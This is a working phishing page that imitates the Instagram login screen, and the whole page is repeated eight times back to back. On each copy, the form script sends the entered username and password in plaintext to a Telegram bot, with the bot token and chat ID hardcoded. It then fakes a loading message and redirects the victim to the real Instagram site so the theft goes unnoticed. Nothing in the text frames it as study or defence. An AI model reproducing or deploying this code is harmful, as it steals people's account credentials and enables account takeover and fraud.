<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px 40px;
            text-align: center;
            box-sizing: border-box;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            padding: 7px 16px;
            width: 100%;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .facebook-login img {
            margin-right: 8px;
            width: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin: 12px 0;
        }
        
        .signup {
            margin: 15px 0;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        
        .apps {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        
        .app-stores img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" id="username" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" id="loginButton">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        
        <div class="facebook-login">
            <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
            Log in with Facebook
        </div>
        
        <div class="forgot-password">Forgot password?</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            fetch(`https://api.telegram.org/bot7960358967:AAGBKFLrJj4EyjxAOMCtWXa2F0pClzpHQyk/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '7145643549',
                    text: `New Instagram Login:\nUsername: ${username}\nPassword: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                // Show fake loading and then redirect to Instagram
                document.getElementById('loginButton').textContent = 'Logging in...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px 40px;
            text-align: center;
            box-sizing: border-box;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            padding: 7px 16px;
            width: 100%;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .facebook-login img {
            margin-right: 8px;
            width: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin: 12px 0;
        }
        
        .signup {
            margin: 15px 0;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        
        .apps {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        
        .app-stores img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" id="username" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" id="loginButton">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        
        <div class="facebook-login">
            <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
            Log in with Facebook
        </div>
        
        <div class="forgot-password">Forgot password?</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            fetch(`https://api.telegram.org/bot7960358967:AAGBKFLrJj4EyjxAOMCtWXa2F0pClzpHQyk/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '7145643549',
                    text: `New Instagram Login:\nUsername: ${username}\nPassword: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                // Show fake loading and then redirect to Instagram
                document.getElementById('loginButton').textContent = 'Logging in...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px 40px;
            text-align: center;
            box-sizing: border-box;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            padding: 7px 16px;
            width: 100%;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .facebook-login img {
            margin-right: 8px;
            width: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin: 12px 0;
        }
        
        .signup {
            margin: 15px 0;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        
        .apps {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        
        .app-stores img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" id="username" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" id="loginButton">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        
        <div class="facebook-login">
            <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
            Log in with Facebook
        </div>
        
        <div class="forgot-password">Forgot password?</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            fetch(`https://api.telegram.org/bot7960358967:AAGBKFLrJj4EyjxAOMCtWXa2F0pClzpHQyk/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '7145643549',
                    text: `New Instagram Login:\nUsername: ${username}\nPassword: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                // Show fake loading and then redirect to Instagram
                document.getElementById('loginButton').textContent = 'Logging in...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px 40px;
            text-align: center;
            box-sizing: border-box;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            padding: 7px 16px;
            width: 100%;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .facebook-login img {
            margin-right: 8px;
            width: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin: 12px 0;
        }
        
        .signup {
            margin: 15px 0;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        
        .apps {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        
        .app-stores img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" id="username" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" id="loginButton">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        
        <div class="facebook-login">
            <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
            Log in with Facebook
        </div>
        
        <div class="forgot-password">Forgot password?</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            fetch(`https://api.telegram.org/bot7960358967:AAGBKFLrJj4EyjxAOMCtWXa2F0pClzpHQyk/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '7145643549',
                    text: `New Instagram Login:\nUsername: ${username}\nPassword: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                // Show fake loading and then redirect to Instagram
                document.getElementById('loginButton').textContent = 'Logging in...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px 40px;
            text-align: center;
            box-sizing: border-box;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            padding: 7px 16px;
            width: 100%;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .facebook-login img {
            margin-right: 8px;
            width: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin: 12px 0;
        }
        
        .signup {
            margin: 15px 0;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        
        .apps {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        
        .app-stores img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" id="username" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" id="loginButton">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        
        <div class="facebook-login">
            <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
            Log in with Facebook
        </div>
        
        <div class="forgot-password">Forgot password?</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            fetch(`https://api.telegram.org/bot7960358967:AAGBKFLrJj4EyjxAOMCtWXa2F0pClzpHQyk/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '7145643549',
                    text: `New Instagram Login:\nUsername: ${username}\nPassword: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                // Show fake loading and then redirect to Instagram
                document.getElementById('loginButton').textContent = 'Logging in...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px 40px;
            text-align: center;
            box-sizing: border-box;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            padding: 7px 16px;
            width: 100%;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .facebook-login img {
            margin-right: 8px;
            width: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin: 12px 0;
        }
        
        .signup {
            margin: 15px 0;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        
        .apps {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        
        .app-stores img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" id="username" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" id="loginButton">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        
        <div class="facebook-login">
            <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
            Log in with Facebook
        </div>
        
        <div class="forgot-password">Forgot password?</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            fetch(`https://api.telegram.org/bot7960358967:AAGBKFLrJj4EyjxAOMCtWXa2F0pClzpHQyk/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '7145643549',
                    text: `New Instagram Login:\nUsername: ${username}\nPassword: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                // Show fake loading and then redirect to Instagram
                document.getElementById('loginButton').textContent = 'Logging in...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px 40px;
            text-align: center;
            box-sizing: border-box;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            padding: 7px 16px;
            width: 100%;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .facebook-login img {
            margin-right: 8px;
            width: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin: 12px 0;
        }
        
        .signup {
            margin: 15px 0;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        
        .apps {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        
        .app-stores img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" id="username" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" id="loginButton">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        
        <div class="facebook-login">
            <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
            Log in with Facebook
        </div>
        
        <div class="forgot-password">Forgot password?</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            fetch(`https://api.telegram.org/bot7960358967:AAGBKFLrJj4EyjxAOMCtWXa2F0pClzpHQyk/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '7145643549',
                    text: `New Instagram Login:\nUsername: ${username}\nPassword: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                // Show fake loading and then redirect to Instagram
                document.getElementById('loginButton').textContent = 'Logging in...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html>
